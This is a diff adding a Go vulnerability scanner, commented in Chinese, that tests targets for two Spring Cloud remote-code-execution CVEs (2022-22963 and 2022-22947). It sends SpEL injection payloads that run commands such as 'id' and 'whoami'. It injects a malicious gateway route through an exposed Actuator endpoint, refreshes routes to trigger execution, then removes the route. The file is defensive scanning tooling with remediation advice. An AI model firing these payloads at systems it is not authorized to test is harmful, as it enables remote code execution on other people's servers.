@@ -1,0 +1,763 @@
+package scanner
+
+import (
+	"bytes"
+	"context"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"strings"
+	"time"
+)
+
+// SpringCloudGatewayScanner Spring Cloud Gateway漏洞扫描器
+// 实现CVE-2022-22963和CVE-2022-22947扫描
+type SpringCloudGatewayScanner struct {
+	statistics ScanStatistics // 扫描统计信息
+	startTime  time.Time      // 扫描开始时间
+}
+
+// NewSpringCloudGatewayScanner 创建Spring Cloud Gateway漏洞扫描器
+func NewSpringCloudGatewayScanner() *SpringCloudGatewayScanner {
+	return &SpringCloudGatewayScanner{}
+}
+
+// GetScannerName 获取扫描器名称
+func (s *SpringCloudGatewayScanner) GetScannerName() string {
+	return "spring_cloud_gateway_scanner"
+}
+
+// GetSupportedVulnerabilities 获取支持的漏洞类型
+func (s *SpringCloudGatewayScanner) GetSupportedVulnerabilities() []string {
+	return []string{
+		"CVE-2022-22963",
+		"CVE-2022-22947",
+	}
+}
+
+// GetScanStatistics 获取扫描统计信息
+func (s *SpringCloudGatewayScanner) GetScanStatistics() ScanStatistics {
+	// 确保更新扫描持续时间
+	if s.statistics.ScanDuration == 0 && !s.startTime.IsZero() {
+		s.statistics.ScanDuration = time.Since(s.startTime)
+	}
+	return s.statistics
+}
+
+// Scan 执行Spring Cloud Gateway漏洞扫描
+func (s *SpringCloudGatewayScanner) Scan(ctx context.Context, target string, options ScanOptions) ([]Vulnerability, error) {
+	var vulnerabilities []Vulnerability
+
+	// 初始化统计信息
+	s.statistics = ScanStatistics{}
+	s.startTime = time.Now()
+
+	// 获取或创建Logger
+	logger := options.Logger
+	if logger == nil {
+		logger = NewDefaultLogger()
+	}
+
+	// 创建日志上下文
+	baseCtx := LogContext{
+		Target:      target,
+		ScannerName: s.GetScannerName(),
+		Timestamp:   time.Now(),
+	}
+
+	logger.Info("开始Spring Cloud Gateway漏洞扫描", baseCtx)
+	logger.LogScanStep("初始化扫描器", map[string]interface{}{
+		"target":      target,
+		"scanner":     s.GetScannerName(),
+		"timeout":     options.Timeout,
+		"proxy":       options.Proxy != "",
+		"randomAgent": options.RandomAgent,
+	}, baseCtx)
+
+	// 检查上下文是否已取消
+	select {
+	case <-ctx.Done():
+		err := &ScanError{
+			Type:    ErrorTypeTimeout,
+			Message: "扫描上下文已取消",
+			Target:  target,
+			Err:     ctx.Err(),
+		}
+		logger.Error("扫描被取消", err, baseCtx)
+		return nil, err
+	default:
+	}
+
+	// 创建HTTP客户端
+	clientConfig := HTTPClientConfig{
+		Timeout:   time.Duration(options.Timeout) * time.Second,
+		Proxy:     options.Proxy,
+		SkipSSL:   options.SkipSSL,
+		UserAgent: "",
+		Headers:   options.Headers,
+		Cookies:   options.Cookies,
+	}
+	if options.RandomAgent {
+		clientConfig.UserAgent = getRandomUserAgent()
+		logger.Debug(fmt.Sprintf("使用随机User-Agent: %s", clientConfig.UserAgent), baseCtx)
+	}
+
+	client, err := NewHTTPClient(clientConfig)
+	if err != nil {
+		logger.Error("创建HTTP客户端失败", err, baseCtx)
+		return nil, &ScanError{
+			Type:    ErrorTypeConfig,
+			Message: "创建HTTP客户端失败",
+			Target:  target,
+			Err:     err,
+		}
+	}
+
+	logger.LogScanStep("HTTP客户端创建成功", map[string]interface{}{
+		"timeout": options.Timeout,
+		"proxy":   options.Proxy != "",
+		"skipSSL": options.SkipSSL,
+	}, baseCtx)
+
+	// 扫描CVE-2022-22963 (Spring Cloud Function SpEL注入)
+	logger.Info("开始扫描CVE-2022-22963 (Spring Cloud Function SpEL注入)", baseCtx)
+	cve22963Ctx := baseCtx
+	cve22963Ctx.VulnerabilityType = "CVE-2022-22963"
+	cve22963Vulns, err := s.scanCVE202222963(ctx, client, target, options, cve22963Ctx)
+	if err != nil {
+		logger.Error("扫描CVE-2022-22963时出错", err, cve22963Ctx)
+	} else {
+		logger.Info(fmt.Sprintf("CVE-2022-22963扫描完成，发现 %d 个漏洞", len(cve22963Vulns)), cve22963Ctx)
+		vulnerabilities = append(vulnerabilities, cve22963Vulns...)
+
+		// 调用漏洞发现回调
+		if options.Callbacks != nil && options.Callbacks.OnVulnerabilityFound != nil {
+			for _, vuln := range cve22963Vulns {
+				options.Callbacks.OnVulnerabilityFound(vuln)
+			}
+		}
+	}
+
+	// 扫描CVE-2022-22947 (Spring Cloud Gateway SpEL RCE)
+	logger.Info("开始扫描CVE-2022-22947 (Spring Cloud Gateway SpEL RCE)", baseCtx)
+	cve22947Ctx := baseCtx
+	cve22947Ctx.VulnerabilityType = "CVE-2022-22947"
+	cve22947Vulns, err := s.scanCVE202222947(ctx, client, target, options, cve22947Ctx)
+	if err != nil {
+		logger.Error("扫描CVE-2022-22947时出错", err, cve22947Ctx)
+	} else {
+		logger.Info(fmt.Sprintf("CVE-2022-22947扫描完成，发现 %d 个漏洞", len(cve22947Vulns)), cve22947Ctx)
+		vulnerabilities = append(vulnerabilities, cve22947Vulns...)
+
+		// 调用漏洞发现回调
+		if options.Callbacks != nil && options.Callbacks.OnVulnerabilityFound != nil {
+			for _, vuln := range cve22947Vulns {
+				options.Callbacks.OnVulnerabilityFound(vuln)
+			}
+		}
+	}
+
+	// 添加延迟
+	if options.Delay > 0 {
+		logger.Debug(fmt.Sprintf("等待 %v 后继续", options.Delay), baseCtx)
+		time.Sleep(options.Delay)
+	}
+
+	// 更新统计信息
+	s.statistics.ScanDuration = time.Since(s.startTime)
+	s.statistics.VulnerabilitiesFound = len(vulnerabilities)
+
+	logger.Info(fmt.Sprintf("扫描完成，共发现 %d 个漏洞", len(vulnerabilities)), baseCtx)
+	logger.Info(fmt.Sprintf("扫描统计: %+v", s.statistics), baseCtx)
+
+	// 调用扫描完成回调
+	if options.Callbacks != nil && options.Callbacks.OnScanComplete != nil {
+		options.Callbacks.OnScanComplete(vulnerabilities)
+	}
+
+	return vulnerabilities, nil
+}
+
+// scanCVE202222963 扫描CVE-2022-22963 (Spring Cloud Function SpEL表达式注入)
+// 漏洞描述: Spring Cloud Function的RoutingFunction类的apply方法将请求头中的
+// "spring.cloud.function.routing-expression"参数作为SpEL表达式进行处理，
+// 导致SpEL表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码
+func (s *SpringCloudGatewayScanner) scanCVE202222963(ctx context.Context, client *HTTPClient, target string, options ScanOptions, logCtx LogContext) ([]Vulnerability, error) {
+	var vulnerabilities []Vulnerability
+	logger := options.Logger
+	if logger == nil {
+		logger = NewDefaultLogger()
+	}
+
+	// CVE-2022-22963: Spring Cloud Function SpEL注入
+	// 攻击方式: 通过spring.cloud.function.routing-expression请求头注入SpEL表达式
+
+	logger.LogScanStep("开始CVE-2022-22963扫描", map[string]interface{}{
+		"description":  "Spring Cloud Function SpEL表达式注入漏洞",
+		"attackMethod": "通过spring.cloud.function.routing-expression请求头注入",
+	}, logCtx)
+
+	// 检查上下文是否已取消
+	select {
+	case <-ctx.Done():
+		err := &ScanError{
+			Type:    ErrorTypeTimeout,
+			Message: "扫描上下文已取消",
+			Target:  target,
+			Err:     ctx.Err(),
+		}
+		logger.Error("扫描被取消", err, logCtx)
+		return nil, err
+	default:
+	}
+
+	// 常见的Spring Cloud Function端点
+	endpoints := []string{
+		"/",
+		"/functionRouter",
+		"/actuator",
+		"/actuator/functionRouter",
+	}
+
+	// 测试用的SpEL表达式载荷
+	// 使用T(java.lang.Runtime).getRuntime().exec()尝试执行命令
+	// 使用安全的测试载荷，不会造成实际危害
+	testPayloads := []string{
+		"T(java.lang.Runtime).getRuntime().exec('calc')", // Windows测试
+		"T(java.lang.Runtime).getRuntime().exec('id')",   // Linux测试
+		"T(String).getClass().forName('java.lang.Runtime')",
+		"#{7*7}", // 简单算术测试
+		"T(java.lang.System).getProperty('java.version')", // 获取系统属性
+	}
+
+	logger.Info(fmt.Sprintf("将测试 %d 个端点和 %d 个载荷", len(endpoints), len(testPayloads)), logCtx)
+
+	for i, endpoint := range endpoints {
+		url := strings.TrimRight(target, "/") + endpoint
+		stepCtx := logCtx
+		stepCtx.Step = fmt.Sprintf("测试端点 %d/%d: %s", i+1, len(endpoints), endpoint)
+
+		logger.Debug(fmt.Sprintf("测试端点: %s", endpoint), stepCtx)
+
+		// 检查上下文是否已取消
+		select {
+		case <-ctx.Done():
+			err := &ScanError{
+				Type:    ErrorTypeTimeout,
+				Message: "扫描上下文已取消",
+				Target:  target,
+				Err:     ctx.Err(),
+			}
+			logger.Error("扫描被取消", err, stepCtx)
+			return nil, err
+		default:
+		}
+
+		for j, payload := range testPayloads {
+			payloadCtx := stepCtx
+			payloadCtx.Extra = map[string]interface{}{
+				"payloadIndex":  j + 1,
+				"totalPayloads": len(testPayloads),
+				"payload":       payload,
+			}
+
+			// 创建请求
+			req, err := http.NewRequestWithContext(ctx, "POST", url, nil)
+			if err != nil {
+				logger.Warn(fmt.Sprintf("创建请求失败: %v", err), payloadCtx)
+				continue
+			}
+
+			// 设置攻击载荷到请求头
+			req.Header.Set("spring.cloud.function.routing-expression", payload)
+			req.Header.Set("Content-Type", "application/json")
+
+			// 记录请求详情
+			headers := make(map[string]string)
+			for k, v := range req.Header {
+				if len(v) > 0 {
+					headers[k] = v[0]
+				}
+			}
+			logger.LogRequest("POST", url, headers, nil, payloadCtx)
+
+			// 使用自定义客户端发送请求
+			startTime := time.Now()
+			resp, err := client.Do(req)
+			duration := time.Since(startTime)
+
+			if err != nil {
+				logger.Warn(fmt.Sprintf("请求失败: %v", err), payloadCtx)
+				continue
+			}
+
+			// 记录响应详情
+			respHeaders := make(map[string]string)
+			for k, v := range resp.Header {
+				if len(v) > 0 {
+					respHeaders[k] = v[0]
+				}
+			}
+
+			// 分析响应判断是否存在漏洞
+			// 如果SpEL表达式被执行，响应中可能包含执行结果或错误信息
+			bodyBuf := new(bytes.Buffer)
+			responseBody := ""
+			if resp.Body != nil {
+				bodyBuf.ReadFrom(resp.Body)
+				responseBody = bodyBuf.String()
+				resp.Body.Close()
+			}
+
+			// 记录响应
+			logger.LogResponse(resp.StatusCode, respHeaders, []byte(responseBody), duration, payloadCtx)
+
+			// 检查响应中是否包含SpEL执行的特征
+			// 1. 状态码200且响应体包含计算结果
+			// 2. 响应中包含java.lang.Runtime相关错误信息
+			// 3. 响应中包含命令执行结果
+			isVulnerable := false
+			vulnProof := ""
+			detectionDetails := make(map[string]interface{})
+
+			logger.Debug(fmt.Sprintf("分析响应，状态码: %d", resp.StatusCode), payloadCtx)
+
+			if resp.StatusCode == 200 || resp.StatusCode == 400 || resp.StatusCode == 500 {
+				// 检查是否有SpEL表达式执行的特征
+				checks := map[string]bool{
+					"runtime":     strings.Contains(strings.ToLower(responseBody), "runtime"),
+					"java.lang":   strings.Contains(strings.ToLower(responseBody), "java.lang"),
+					"spel_result": strings.Contains(responseBody, "49"), // 7*7的结果
+					"spel":        strings.Contains(strings.ToLower(responseBody), "spel"),
+				}
+
+				logger.Debug(fmt.Sprintf("响应体特征检查: %v", checks), payloadCtx)
+				detectionDetails["responseChecks"] = checks
+
+				if checks["runtime"] || checks["java.lang"] || checks["spel_result"] || checks["spel"] {
+					isVulnerable = true
+					vulnProof = fmt.Sprintf("响应中包含SpEL表达式执行特征，状态码: %d", resp.StatusCode)
+					detectionDetails["matchedPatterns"] = checks
+				}
+
+				// 检查响应头中是否有异常信息
+				headerChecks := map[string]string{
+					"X-Spel-Error": resp.Header.Get("X-Spel-Error"),
+					"Error":        resp.Header.Get("Error"),
+				}
+				logger.Debug(fmt.Sprintf("响应头检查: %v", headerChecks), payloadCtx)
+				detectionDetails["headerChecks"] = headerChecks
+
+				if headerChecks["X-Spel-Error"] != "" ||
+					strings.Contains(strings.ToLower(headerChecks["Error"]), "spel") {
+					isVulnerable = true
+					vulnProof = fmt.Sprintf("响应头中包含SpEL相关信息，状态码: %d", resp.StatusCode)
+				}
+			}
+
+			if isVulnerable {
+				logger.Warn("检测到潜在的漏洞特征，进行详细分析", payloadCtx)
+				logger.LogScanStep("漏洞确认", detectionDetails, payloadCtx)
+
+				// 截断响应内容，最多显示1000字符
+				responseContent := responseBody
+				if len(responseContent) > 1000 {
+					responseContent = responseContent[:1000] + "...[截断]"
+				}
+
+				vulnerability := Vulnerability{
+					ID:                len(vulnerabilities) + 1,
+					VulnerabilityType: "CVE-2022-22963",
+					Severity:          "严重",
+					Target:            target,
+					URL:               url,
+					Payload:           fmt.Sprintf("spring.cloud.function.routing-expression: %s", payload),
+					Description:       "Spring Cloud Function存在SpEL表达式注入漏洞。攻击者可以通过请求头'spring.cloud.function.routing-expression'注入恶意SpEL表达式，导致远程代码执行(RCE)。",
+					Proof:             vulnProof,
+					Recommendation:    "升级Spring Cloud Function至3.2.3或更高版本，或升级至3.1.7版本。如果无法立即升级，可以禁用RoutingFunction功能或配置安全策略。",
+					ResponseHeaders:   respHeaders,
+					ResponseContent:   responseContent,
+					Timestamp:         time.Now(),
+				}
+				vulnerabilities = append(vulnerabilities, vulnerability)
+
+				// 记录漏洞发现
+				logger.LogVulnerabilityFound(vulnerability, payloadCtx)
+				logger.Info(fmt.Sprintf("发现漏洞: %s at %s", vulnerability.VulnerabilityType, url), payloadCtx)
+
+				// 找到一个漏洞后，跳出内层循环，继续下一个端点
+				break
+			} else {
+				logger.Debug("未发现漏洞特征，继续测试下一个载荷", payloadCtx)
+			}
+		}
+	}
+
+	return vulnerabilities, nil
+}
+
+// scanCVE202222947 扫描CVE-2022-22947 (Spring Cloud Gateway SpEL远程代码执行)
+// 漏洞描述: 当Spring Cloud Gateway的Actuator端点启用、暴露且未受保护时，
+// 攻击者可以通过特制的请求，利用SpEL表达式注入，导致远程代码执行
+func (s *SpringCloudGatewayScanner) scanCVE202222947(ctx context.Context, client *HTTPClient, target string, options ScanOptions, logCtx LogContext) ([]Vulnerability, error) {
+	var vulnerabilities []Vulnerability
+	logger := options.Logger
+	if logger == nil {
+		logger = NewDefaultLogger()
+	}
+
+	// CVE-2022-22947: Spring Cloud Gateway SpEL RCE
+	// 攻击方式: 通过Actuator的/gateway/routes端点添加恶意路由，包含SpEL表达式
+
+	logger.LogScanStep("开始CVE-2022-22947扫描", map[string]interface{}{
+		"description":  "Spring Cloud Gateway SpEL远程代码执行漏洞",
+		"attackMethod": "通过Actuator端点添加恶意路由",
+	}, logCtx)
+
+	// 检查上下文是否已取消
+	select {
+	case <-ctx.Done():
+		err := &ScanError{
+			Type:    ErrorTypeTimeout,
+			Message: "扫描上下文已取消",
+			Target:  target,
+			Err:     ctx.Err(),
+		}
+		logger.Error("扫描被取消", err, logCtx)
+		return nil, err
+	default:
+	}
+
+	// Actuator端点路径
+	actuatorBasePaths := []string{
+		"/actuator",
+		"/actuator/gateway",
+	}
+
+	// 构造恶意路由配置，包含SpEL表达式
+	maliciousRouteID := fmt.Sprintf("hacktest%d", time.Now().Unix())
+
+	// 测试用的SpEL表达式载荷
+	testPayloads := []string{
+		"#{T(java.lang.Runtime).getRuntime().exec('calc')}",
+		"#{T(java.lang.Runtime).getRuntime().exec('id')}",
+		"#{7*7}",
+		"#{T(java.lang.System).getProperty('java.version')}",
+		"#{new java.lang.ProcessBuilder('whoami').start()}",
+	}
+
+	logger.Info(fmt.Sprintf("将测试 %d 个Actuator路径和 %d 个载荷", len(actuatorBasePaths), len(testPayloads)), logCtx)
+
+	for i, basePath := range actuatorBasePaths {
+		// 检查/gateway/routes端点是否存在
+		routesURL := strings.TrimRight(target, "/") + basePath + "/gateway/routes"
+
+		stepCtx := logCtx
+		stepCtx.Step = fmt.Sprintf("测试Actuator路径 %d/%d: %s", i+1, len(actuatorBasePaths), basePath)
+		logger.Debug(fmt.Sprintf("检查Actuator端点: %s", routesURL), stepCtx)
+
+		// 检查上下文是否已取消
+		select {
+		case <-ctx.Done():
+			err := &ScanError{
+				Type:    ErrorTypeTimeout,
+				Message: "扫描上下文已取消",
+				Target:  target,
+				Err:     ctx.Err(),
+			}
+			logger.Error("扫描被取消", err, stepCtx)
+			return nil, err
+		default:
+		}
+
+		// 先尝试获取现有路由（检查端点是否可访问）
+		startTime := time.Now()
+		resp, err := client.Get(routesURL)
+		duration := time.Since(startTime)
+
+		if err != nil {
+			logger.Warn(fmt.Sprintf("无法访问端点: %v", err), stepCtx)
+			continue
+		}
+
+		// 读取并关闭响应体
+		bodyBuf := new(bytes.Buffer)
+		if resp.Body != nil {
+			bodyBuf.ReadFrom(resp.Body)
+			resp.Body.Close()
+		}
+
+		// 记录响应
+		respHeaders := make(map[string]string)
+		for k, v := range resp.Header {
+			if len(v) > 0 {
+				respHeaders[k] = v[0]
+			}
+		}
+		logger.LogResponse(resp.StatusCode, respHeaders, bodyBuf.Bytes(), duration, stepCtx)
+
+		// 如果端点可访问（状态码200或405），尝试添加恶意路由
+		if resp.StatusCode == 200 || resp.StatusCode == 405 {
+			logger.Info(fmt.Sprintf("Actuator端点可访问 (状态码: %d)，开始测试路由注入", resp.StatusCode), stepCtx)
+			// 尝试添加包含SpEL表达式的路由
+			for j, payload := range testPayloads {
+				payloadCtx := stepCtx
+				payloadCtx.Extra = map[string]interface{}{
+					"payloadIndex":  j + 1,
+					"totalPayloads": len(testPayloads),
+					"payload":       payload,
+					"routeID":       maliciousRouteID,
+				}
+
+				logger.Debug(fmt.Sprintf("测试载荷 %d/%d: %s", j+1, len(testPayloads), payload), payloadCtx)
+
+				// 检查上下文是否已取消
+				select {
+				case <-ctx.Done():
+					err := &ScanError{
+						Type:    ErrorTypeTimeout,
+						Message: "扫描上下文已取消",
+						Target:  target,
+						Err:     ctx.Err(),
+					}
+					logger.Error("扫描被取消", err, payloadCtx)
+					return nil, err
+				default:
+				}
+
+				// 构造恶意路由配置
+				routeConfig := map[string]interface{}{
+					"id": maliciousRouteID,
+					"filters": []map[string]interface{}{
+						{
+							"name": "AddResponseHeader",
+							"args": map[string]interface{}{
+								"name":  "Result",
+								"value": payload, // SpEL表达式注入点
+							},
+						},
+					},
+					"uri": "http://example.com",
+					"predicates": []map[string]interface{}{
+						{
+							"name": "Path",
+							"args": map[string]interface{}{
+								"pattern": "/test",
+							},
+						},
+					},
+				}
+
+				// 将配置转换为JSON
+				jsonData, err := json.Marshal(routeConfig)
+				if err != nil {
+					logger.Warn(fmt.Sprintf("序列化路由配置失败: %v", err), payloadCtx)
+					continue
+				}
+
+				logger.LogScanStep("添加恶意路由", map[string]interface{}{
+					"routeID": maliciousRouteID,
+					"payload": payload,
+					"config":  string(jsonData),
+				}, payloadCtx)
+
+				// 创建POST请求添加路由
+				req, err := http.NewRequestWithContext(ctx, "POST", routesURL, bytes.NewBuffer(jsonData))
+				if err != nil {
+					logger.Warn(fmt.Sprintf("创建请求失败: %v", err), payloadCtx)
+					continue
+				}
+
+				req.Header.Set("Content-Type", "application/json")
+
+				// 记录请求
+				headers := make(map[string]string)
+				for k, v := range req.Header {
+					if len(v) > 0 {
+						headers[k] = v[0]
+					}
+				}
+				logger.LogRequest("POST", routesURL, headers, jsonData, payloadCtx)
+
+				// 发送请求
+				startTime := time.Now()
+				resp, err := client.Do(req)
+				duration := time.Since(startTime)
+
+				if err != nil {
+					logger.Warn(fmt.Sprintf("添加路由请求失败: %v", err), payloadCtx)
+					continue
+				}
+
+				// 读取响应体
+				bodyBuf := new(bytes.Buffer)
+				if resp.Body != nil {
+					bodyBuf.ReadFrom(resp.Body)
+					resp.Body.Close()
+				}
+
+				// 记录响应
+				respHeaders := make(map[string]string)
+				for k, v := range resp.Header {
+					if len(v) > 0 {
+						respHeaders[k] = v[0]
+					}
+				}
+				logger.LogResponse(resp.StatusCode, respHeaders, bodyBuf.Bytes(), duration, payloadCtx)
+
+				// 如果路由添加成功（状态码201或200），触发路由刷新
+				if resp.StatusCode == 201 || resp.StatusCode == 200 {
+					logger.Info(fmt.Sprintf("路由添加成功 (状态码: %d)，开始刷新路由以触发SpEL执行", resp.StatusCode), payloadCtx)
+					// 定义清理函数，确保无论是否检测到漏洞都清理测试路由
+					cleanupRoute := func() {
+						deleteURL := routesURL + "/" + maliciousRouteID
+						deleteReq, err := http.NewRequest("DELETE", deleteURL, nil)
+						if err == nil {
+							deleteReq.Header.Set("Content-Type", "application/json")
+							if deleteResp, err := client.Do(deleteReq); err == nil && deleteResp.Body != nil {
+								io.Copy(io.Discard, deleteResp.Body)
+								deleteResp.Body.Close()
+							}
+						}
+					}
+					defer cleanupRoute()
+
+					// 刷新路由以触发SpEL表达式执行
+					refreshURL := strings.TrimRight(target, "/") + basePath + "/gateway/refresh"
+					logger.Debug(fmt.Sprintf("刷新路由: %s", refreshURL), payloadCtx)
+
+					refreshReq, err := http.NewRequest("POST", refreshURL, nil)
+					if err != nil {
+						logger.Warn(fmt.Sprintf("创建刷新请求失败: %v", err), payloadCtx)
+						continue
+					}
+					refreshReq.Header.Set("Content-Type", "application/json")
+
+					refreshStartTime := time.Now()
+					refreshResp, err := client.Do(refreshReq)
+					refreshDuration := time.Since(refreshStartTime)
+
+					if err != nil {
+						logger.Warn(fmt.Sprintf("刷新路由失败: %v", err), payloadCtx)
+						continue
+					}
+
+					refreshBodyBuf := new(bytes.Buffer)
+					if refreshResp.Body != nil {
+						refreshBodyBuf.ReadFrom(refreshResp.Body)
+						refreshResp.Body.Close()
+					}
+
+					refreshHeaders := make(map[string]string)
+					for k, v := range refreshResp.Header {
+						if len(v) > 0 {
+							refreshHeaders[k] = v[0]
+						}
+					}
+					logger.LogResponse(refreshResp.StatusCode, refreshHeaders, refreshBodyBuf.Bytes(), refreshDuration, payloadCtx)
+
+					// 访问测试路由，检查SpEL是否被执行
+					testURL := strings.TrimRight(target, "/") + "/test"
+					logger.Debug(fmt.Sprintf("访问测试路由: %s", testURL), payloadCtx)
+
+					testStartTime := time.Now()
+					testResp, err := client.Get(testURL)
+					testDuration := time.Since(testStartTime)
+
+					if err != nil {
+						logger.Warn(fmt.Sprintf("访问测试路由失败: %v", err), payloadCtx)
+						continue
+					}
+
+					// 检查响应头中是否包含SpEL执行结果
+					bodyBuf := new(bytes.Buffer)
+					responseBody := ""
+					if testResp.Body != nil {
+						bodyBuf.ReadFrom(testResp.Body)
+						responseBody = bodyBuf.String()
+						testResp.Body.Close()
+					}
+
+					// 记录测试路由响应
+					testRespHeaders := make(map[string]string)
+					for k, v := range testResp.Header {
+						if len(v) > 0 {
+							testRespHeaders[k] = v[0]
+						}
+					}
+					logger.LogResponse(testResp.StatusCode, testRespHeaders, []byte(responseBody), testDuration, payloadCtx)
+
+					// 检查响应头Result字段或响应体
+					resultHeader := testResp.Header.Get("Result")
+					isVulnerable := false
+					vulnProof := ""
+					detectionDetails := make(map[string]interface{})
+
+					logger.Debug(fmt.Sprintf("分析测试路由响应，状态码: %d, Result头: %s", testResp.StatusCode, resultHeader), payloadCtx)
+
+					if resultHeader != "" {
+						// 如果响应头中包含结果，说明SpEL可能被执行
+						isVulnerable = true
+						vulnProof = fmt.Sprintf("响应头Result字段: %s, 状态码: %d", resultHeader, testResp.StatusCode)
+						detectionDetails["resultHeader"] = resultHeader
+						logger.Warn(fmt.Sprintf("检测到响应头Result字段: %s", resultHeader), payloadCtx)
+					} else {
+						// 检查响应体
+						checks := map[string]bool{
+							"spel_result": strings.Contains(responseBody, "49"), // 7*7的结果
+							"runtime":     strings.Contains(strings.ToLower(responseBody), "runtime"),
+							"java.lang":   strings.Contains(strings.ToLower(responseBody), "java.lang"),
+						}
+						detectionDetails["responseChecks"] = checks
+						logger.Debug(fmt.Sprintf("响应体特征检查: %v", checks), payloadCtx)
+
+						if checks["spel_result"] || checks["runtime"] || checks["java.lang"] {
+							isVulnerable = true
+							vulnProof = fmt.Sprintf("响应体包含SpEL执行特征，状态码: %d", testResp.StatusCode)
+							detectionDetails["matchedPatterns"] = checks
+						}
+					}
+
+					if isVulnerable {
+						logger.Warn("检测到潜在的漏洞特征，进行详细分析", payloadCtx)
+						logger.LogScanStep("漏洞确认", detectionDetails, payloadCtx)
+
+						// 截断响应内容，最多显示1000字符
+						responseContent := responseBody
+						if len(responseContent) > 1000 {
+							responseContent = responseContent[:1000] + "...[截断]"
+						}
+
+						vulnerability := Vulnerability{
+							ID:                len(vulnerabilities) + 1,
+							VulnerabilityType: "CVE-2022-22947",
+							Severity:          "严重",
+							Target:            target,
+							URL:               routesURL,
+							Payload:           fmt.Sprintf("POST route with SpEL: %s", payload),
+							Description:       "Spring Cloud Gateway存在SpEL表达式注入漏洞。当Actuator端点启用且未受保护时，攻击者可以通过添加恶意路由，注入SpEL表达式导致远程代码执行(RCE)。",
+							Proof:             vulnProof,
+							Recommendation:    "升级Spring Cloud Gateway至3.1.1或更高版本，或升级至3.0.7版本。禁用Actuator端点或配置安全认证，避免暴露/gateway/routes端点。",
+							ResponseHeaders:   testRespHeaders,
+							ResponseContent:   responseContent,
+							Timestamp:         time.Now(),
+						}
+						vulnerabilities = append(vulnerabilities, vulnerability)
+
+						// 记录漏洞发现
+						logger.LogVulnerabilityFound(vulnerability, payloadCtx)
+						logger.Info(fmt.Sprintf("发现漏洞: %s at %s", vulnerability.VulnerabilityType, routesURL), payloadCtx)
+
+						// 如果已经检测到漏洞，跳出循环
+						break
+					} else {
+						logger.Debug("未发现漏洞特征，继续测试下一个载荷", payloadCtx)
+					}
+				}
+			}
+		}
+	}
+
+	return vulnerabilities, nil
+}
